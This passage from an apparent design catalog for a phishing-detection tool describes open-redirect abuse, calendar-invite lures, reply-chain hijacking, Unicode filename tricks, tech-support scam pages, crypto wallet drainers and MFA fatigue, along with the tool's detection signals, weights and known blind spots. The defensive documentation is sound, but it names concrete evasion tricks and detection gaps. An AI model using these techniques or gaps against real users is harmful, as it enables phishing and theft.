  click advice `open_in_reading_room`.
- `dynamic.free_hosting_login` **60**, never softened: a sign-in / identity form
  or a brand name on a page served from one of these hosts. `do_not_open`.

**Sources.**
[Fortra: pages.dev and workers.dev increasingly abused](https://www.fortra.com/blog/cloudflares-pagesdev-and-workersdev-domains-increasingly-abused-phishing) ·
[Check Point: Google Calendar invites with Google Forms / Drawings](https://blog.checkpoint.com/securing-user-and-access/google-calendar-notifications-bypassing-email-security-policies/)

## 17. Open redirects and link wrappers

**How it works.** The link starts on a domain everyone trusts and forwards to
the phishing site: `google.com/url?q=`, `google.com/amp/s/`, `bing.com/ck/a?…&u=a1<base64>`,
`l.facebook.com/l.php?u=`, `youtube.com/redirect?q=`, `linkedin.com/redir/redirect?url=`,
LinkedIn Smart Links (`linkedin.com/slink?code=`, destination stored
server-side), `duckduckgo.com/l/?uddg=`, `slack-redir.net`. Security wrappers
(Outlook Safe Links, Proofpoint URL Defense v2/v3, Barracuda, Mimecast) look
the same but are benign. SANS ISC tracks how often 2025-2026 phishing uses
redirects.

| Where | Observable |
|---|---|
| Email | Wrapped links; the visible domain is the redirector. |
| Landing page | The redirect chain in the sandbox. |
| Downloads | As the destination. |

**Detection.** `analysis/redirects.py` unwraps every decodable layer (nested
too: Safe Links around google.com/url); `normalize_url` scores and detonates
the innermost target; the wrapper stays in `ExtractedUrl.raw`.
- `url.open_redirect` **20** when an abused redirector forwards to an
  unpopular site (**10** for hidden destinations such as LinkedIn Smart Links,
  which the sandbox then follows); none for security wrappers or for
  redirects to popular sites. Verified-newsletter soft list.
- `UrlVerdict.redirect_chain`: wrappers outermost first, then the sandbox's
  redirect hops, so the report can show the whole path.
- Click advice `open_in_reading_room` (unless the destination is worse).

**Sources.**
[SANS ISC: phishing campaign abusing google.com open redirects †](https://isc.sans.edu/diary/31950) ·
[SANS ISC: how often are redirects used in phishing in 2026? †](https://isc.sans.edu/diary/32870) ·
[DuoCircle: LinkedIn Smart Links abused in phishing †](https://www.duocircle.com/email-security/threat-actors-abuse-linkedins-smart-links-in-evasive-email-phishing-attacks)

## 18. Calendar invite phishing

**How it works.** A calendar invitation (`.ics`, or a real Google Calendar
notification with spoofed sender headers) carries a link, usually to Google
Forms or Google Drawings, then a fake reCAPTCHA or "support" button, then a
crypto or payment-theft page. Check Point counted ~4,000 emails against ~300
brands in four weeks. Invitations also carry Teams "meeting codes" for device
code phishing (section 8).

| Where | Observable |
|---|---|
| Email | `text/calendar` part or `.ics` attachment with links; Forms / Drawings URLs; unknown organiser. |
| Landing page | Google Forms / Drawings with a single "verify" button; fake CAPTCHA; crypto pages. |
| Downloads | None usually. |

**Detection.** Links inside `.ics` / `text/calendar` parts are extracted as text
(`analysis/urls.py`) and detonated like any link; `docs.google.com/forms` and
`/drawings` raise `url.free_hosting`; the landing page goes through the
ClickFix, wallet-drainer and credential checks; device codes in the invite
raise `bec.device_code_lure`.

**Sources.**
[Check Point: Google Calendar notifications bypassing email security](https://blog.checkpoint.com/securing-user-and-access/google-calendar-notifications-bypassing-email-security-policies/)

## 19. Reply-chain hijacking

**How it works.** After stealing a mailbox (often via AiTM), the attacker
replies inside a real, older thread with a link or attachment. The sender is a
real contact, authentication passes, and the context is genuine.

| Where | Observable |
|---|---|
| Email | Real contact, `Re:` subject, quoted history; a sudden link / ZIP / HTML attachment or a bank-detail change; sometimes a lookalike domain swapped in mid-thread. |
| Landing page | As the payload. |
| Downloads | As the payload. |

**Detection.** No sender-based shortcut: trust never skips the sandbox
(`pipeline._finish`), and every lure and credential signal is protected, so a
trusted contact's ClickFix link is still `dynamic.clickfix` 100 and the report
says "This sender is on your trusted list, but this email looks different"
(tested in `tests/functional/analysis/test_lure_corpus.py`). Lookalike
contacts: `bec.from_lookalike_contact`; money: `bec.payment_change`.

**Sources.**
[Microsoft: detecting a multi-stage AiTM phishing and BEC campaign †](https://www.microsoft.com/en-us/security/blog/2023/06/08/detecting-and-mitigating-a-multi-stage-aitm-phishing-and-bec-campaign/)

## 20. Unicode tricks

**How it works.**
- **RTLO (U+202E)** reverses display: `Invoice_\u202Efdp.exe` reads as
  `Invoice_exe.pdf`.
- **Look-alike dots** (`․` U+2024, `．` U+FF0E) and **space padding**
  (`Statement.pdf          .exe`) hide the real extension.
- **Zero-width characters** (U+200B/C/D, U+2060, U+FEFF, soft hyphen) split
  brand names (`Pay\u200bPal`) in display names and link text so filters miss
  them.
- **Homoglyph domains** (Cyrillic `а` in `pаypal.com`, punycode `xn--`).

**Detection.** `attachment.filename_trick` 50 now also covers zero-width
characters, look-alike dots and space padding, and the dangerous-type check
uses the cleaned name (`Invoice.pdf\u2024exe` is an `.exe`).
`sender.display_hidden_chars` **30** and brand checks run on the cleaned
display name. `url.hidden_characters` **20** for link text. Existing:
`url.punycode`, `url.lookalike`, `sender.domain_lookalike`.

**Sources.**
[MITRE ATT&CK T1036.002 Right-to-Left Override †](https://attack.mitre.org/techniques/T1036/002/)

## 21. Browser notification spam

**How it works.** A page says "Click Allow to confirm you are not a robot".
Pressing Allow subscribes the browser to push notifications, which then
show fake virus alerts, fake "your PC is infected" and scam ads long after the
tab is closed.

| Where | Observable |
|---|---|
| Email | Links to "prize" / "video" / "verify" pages. |
| Landing page | `Notification.requestPermission()`, `PushManager.subscribe()`; "Allow" instructions. |
| Downloads | None. |

**Detection.** The init script records permission requests
(`PageFeatures.notification_permission_requested`) and always answers
"default" / denied. `dynamic.notification_spam` **25** on unpopular hosts
(bulk-capped). Click advice `open_in_reading_room`.

**Sources.** Background only (no primary write-up read for this catalog);
see the tech-support scam sources in section 22, which list notification
spam as an entry point.

## 22. Tech-support scam pages

**How it works.** A full-screen page imitates a Windows Defender / Apple
warning ("Access to this PC has been blocked", error codes like 0x80073afc),
plays alerts in a loop, locks the keyboard (`navigator.keyboard.lock`),
blocks closing (`beforeunload`), and shows "Call Microsoft Support" with a
toll-free number. The "technician" then installs remote access (Quick Assist,
AnyDesk) and takes money or deploys ransomware (Storm-1811).

| Where | Observable |
|---|---|
| Email | Links to such pages; fake renewal invoices (section 14); Teams "IT support" contact. |
| Landing page | Fullscreen request, keyboard lock, alert loop, beforeunload trap; scare phrases plus a phone number. |
| Downloads | Remote-access tools. |

**Detection.** The init script records fullscreen and keyboard-lock calls and
`beforeunload`; the chamber counts dialogs. `dynamic.tech_support_scam` **80**,
never softened: scare phrases + a phone number + at least one locking
behaviour (or two scare phrases), on an unpopular host. The evidence carries
the phone numbers. `do_not_open`.

**Sources.**
[Microsoft Learn: tech support scams †](https://learn.microsoft.com/en-us/defender-endpoint/malware/support-scams) ·
[Microsoft: Quick Assist misused in social engineering (Storm-1811) †](https://www.microsoft.com/en-us/security/blog/2024/05/15/threat-actors-misusing-quick-assist-in-social-engineering-attacks-leading-to-ransomware/) ·
[Microsoft: how a Teams "support call" led to compromise, Mar 2026 †](https://www.microsoft.com/en-us/security/blog/2026/03/16/help-on-the-line-how-a-microsoft-teams-support-call-led-to-compromise/)

## 23. Crypto wallet drainers

**How it works.** Drainer-as-a-service kits (Inferno, Angel, Pink and others)
clone airdrop / NFT / exchange pages. "Connect wallet" calls
`window.ethereum.request({method: 'eth_requestAccounts'})`, then asks for a
signature (`eth_signTypedData_v4` permits, `setApprovalForAll`) that lets the
kit move every token. Other pages simply ask for the 12/24-word recovery phrase.

| Where | Observable |
|---|---|
| Email | Airdrop / claim / "wallet verification" / exchange security notices. |
| Landing page | Wallet requests, "connect wallet", "claim", seed-phrase inputs. |
| Downloads | None. |

**Detection.** The init script installs a decoy `window.ethereum` (only when
none exists) that records requested methods and always rejects them with
"user rejected". The lure clicker presses "Connect wallet" / "Claim".
`dynamic.wallet_drainer` **85**, never softened: an account / signature
request plus wallet-lure words, or a seed-phrase input next to recovery-phrase
text, on an unpopular host. Passive probes (`eth_chainId`, `eth_accounts`)
do not count.

**Sources.**
[Check Point Research: Inferno Drainer reloaded †](https://research.checkpoint.com/2025/inferno-drainer-reloaded-deep-dive-into-the-return-of-the-most-sophisticated-crypto-drainer/) ·
[Group-IB: Inferno Drainer †](https://www.group-ib.com/blog/inferno-drainer/)

## 24. "Verify your account" + MFA fatigue

**How it works.** "Your mailbox will be suspended, verify now" leads to a
credential page (often AiTM). With the password, the attacker spams MFA push
prompts until the victim taps Approve, or calls pretending to be IT and asks
for the code.

| Where | Observable |
|---|---|
| Email | Urgency + account words; brand impersonation; credential-ish URL paths. |
| Landing page | Credential form (sections 5-6). |
| Downloads | None. |

**Detection.** The credential page is caught by `dynamic.credential_phish`,
`dynamic.aitm_proxy`, `dynamic.free_hosting_login` and friends; `url.credential_words`
and `subject.urgency` add weight. Push bombing itself happens outside email:
**advice only** (approve only what you started; prefer number matching or
passkeys).

**Sources.**
[CISA: implementing number matching in MFA apps †](https://www.cisa.gov/sites/default/files/publications/fact-sheet-implement-number-matching-in-mfa-applications-508c.pdf) ·
[CISA: implementing phishing-resistant MFA †](https://www.cisa.gov/sites/default/files/publications/fact-sheet-implementing-phishing-resistant-mfa-508c.pdf)

## 25. Voice and deepfake follow-ups

**How it works.** A call or voice message (AI-cloned voice of a boss, banker,
family member or official) follows an email to add urgency: "did you get my
email? Please approve the wire / read me the code." FBI IC3 warned in 2025
of AI voice messages impersonating senior US officials.

**Detection.** Out of scope: we see the email, not the call. The email half is
still scored (`bec.payment_change`, `bec.channel_switch`,
`bec.urgency_secrecy`, `bec.gift_card`). **Advice for the client:** hang up
and call back on a number you already have; agree a family / office code
word; never read out a code or approve a sign-in because someone asked.

**Sources.**
[FBI IC3 PSA: senior US officials impersonated with AI voice messages, May 2025 †](https://www.ic3.gov/PSA/2025/PSA250515) ·
[FBI IC3: deepfake media scams infographic †](https://www.ic3.gov/Outreach/Brochures/2025-ABA-Foundation-Deep-Fake-Infographic.pdf)

---

## Coverage matrix

| # | Technique | Signals (weight) | Never softened | Click advice |
|---|---|---|---|---|
| 1 | ClickFix | `dynamic.clickfix` (100), `dynamic.clipboard_hijack` (90), `dynamic.fake_captcha` (40), `attachment.html_clickfix` (70/90) | yes | do_not_open |
| 2 | FileFix | `dynamic.clickfix` (100) | yes | do_not_open |
| 3 | macOS Terminal | `dynamic.clickfix` (100) | yes | do_not_open |
| 4 | Fake update / fix error | `dynamic.clickfix`, `dynamic.dangerous_download` (65) | yes | do_not_open |
| 5 | Turnstile-gated phishing | `dynamic.captcha_gated_login` (30), `dynamic.hidden_from_automation` (20) | no (bulk-capped) | reading room / do_not_open with the form |
| 6 | AiTM kits | `dynamic.aitm_proxy` (70), `dynamic.anti_analysis` (25), `dynamic.ua_cloaking` (20), `dynamic.credential_phish` | aitm/credential: yes | do_not_open |
| 7 | Browser-in-the-Browser | `dynamic.credential_phish`, `dynamic.password_unknown_host` (partial) | yes | do_not_open |
| 8 | Device code | `bec.device_code_lure` (70), `dynamic.device_code_lure` (70) | yes | do_not_open (all links) |
| 9 | OAuth consent / redirect abuse | `url.oauth_consent_lure` (50) | yes | do_not_open |
| 10 | QR / quishing | existing QR decoding (images, PDFs, screenshots) | as destination | as destination |
| 11 | HTML smuggling / HTML attachments | `attachment.html_smuggling`, `attachment.html_redirect` (30/50), `attachment.html_credential_form` | yes | n/a (attachment) |
| 12 | SVG phishing | `attachment.svg_phish` (70) | yes | n/a (attachment) |
| 13 | Containers / LNK / ISO / OneNote / MSIX / .url / .library-ms | `attachment.dangerous_type` (extended), `dynamic.dangerous_download`, `downloads_summary` | yes | do_not_open |
| 14 | Callback (TOAD) | `bec.callback_scam` (45/55) | no (verified newsletters exempt) | n/a (no link) |
| 15 | Invoice / DocuSign / share lures | existing impersonation signals | yes | do_not_open |
| 16 | Free hosting | `url.free_hosting` (12), `dynamic.free_hosting_login` (60) | login: yes | reading room / do_not_open |
| 17 | Open redirects | `url.open_redirect` (20/10), `redirect_chain` | no | reading room |
| 18 | Calendar invites | links in .ics + sections 1, 8, 16 | as destination | as destination |
| 19 | Reply-chain hijacking | trust never skips checks + all protected signals | yes | as destination |
| 20 | Unicode tricks | `attachment.filename_trick` (50), `sender.display_hidden_chars` (30), `url.hidden_characters` (20) | attachment: yes | reading room |
| 21 | Notification spam | `dynamic.notification_spam` (25) | no (bulk-capped) | reading room |
| 22 | Tech-support scam | `dynamic.tech_support_scam` (80) | yes | do_not_open |
| 23 | Wallet drainer | `dynamic.wallet_drainer` (85) | yes | do_not_open |
| 24 | Verify account + MFA fatigue | credential signals; MFA fatigue advice only | yes | do_not_open |
| 25 | Voice / deepfake | advice only | n/a | n/a |

## Known gaps

- **ASCII / table-drawn QR codes** in HTML bodies are not rendered and decoded.
- **Browser-in-the-Browser** has no dedicated "drawn address bar" detector;
  it relies on the password form on the wrong host.
- **Geo / IP cloaking**: the chamber detonates from one network with one user
  agent. A kit that only shows the lure to residential IPs in the client's
  country looks clean (`dynamic.hidden_from_automation` covers the obvious
  cases). A second detonation with a mobile UA / residential egress is
  future work.
- **Lure clicking** clicks up to three elements by text and class. Lures drawn
  on a canvas, or that need a drag / "press and hold" gesture, are not
  triggered; their text instructions are still read.
- **Office / executable detonation** still needs the Windows chamber (unchanged).
- **Callback scams inside PDF attachments**: the phone-number check reads the
  email body only.
